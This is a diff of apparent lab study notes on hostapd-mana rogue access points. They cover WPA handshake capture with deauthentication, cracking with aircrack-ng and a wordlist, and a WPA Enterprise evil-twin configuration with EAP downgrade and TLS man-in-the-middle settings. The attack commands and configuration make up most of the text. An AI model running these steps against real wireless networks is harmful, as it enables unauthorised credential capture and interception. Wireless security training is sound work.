@@ -1,3 +1,4 @@
+*** HOSTAPD-MANA ***
 sudo apt install hostapd-mana
   sudo apt upgrade 
 
@@ -6,8 +7,26 @@ Simple hostapd-mana.conf
   ssid=Mostar
   channel=1
 
-Complex hostapd-mana.conf
-  # SSID of the AP
+Default runs in 802.11b. May need to add the following:
+  hw_mode=g
+  ieee80211n=1
+  wpa=3
+  wpa_key_mgmt=WPA-PSK
+  wpa_passphrase=ANYPASSWORD
+  wpa_pairwise=TKIP CCMP
+  rsn_pairwise=TKIP CCMP
+  mana_wpaout=/home/kali/mostar.hccapx
+
+*** Capturing Handshakes ***
+$sudo hostapd-mana Mostar-mana.conf
+Then deauth with aireplay
+Captured handshake written to hccapx > hashcat or aircrack
+$aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
+
+*** Attacking WPA Enterprise 11.3 ***
+/etc/hostapd-mana/mana.conf, change SSID, interface, password
+
+# SSID of the AP
 ssid=Playtronics
 
 # Network interface to use and driver type
@@ -60,3 +79,12 @@ mana_eapsuccess=1
 
 # EAP TLS MitM
 mana_eaptls=1
+
+
+*** Create the EAP User ***
+/etc/hostapd-mana/mana.eap_user
+*     PEAP,TTLS,TLS,FAST
+"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+
+*** Run Hostapd ***
+$sudo hostapd-mana /etc/hostapd-mana/mana.conf
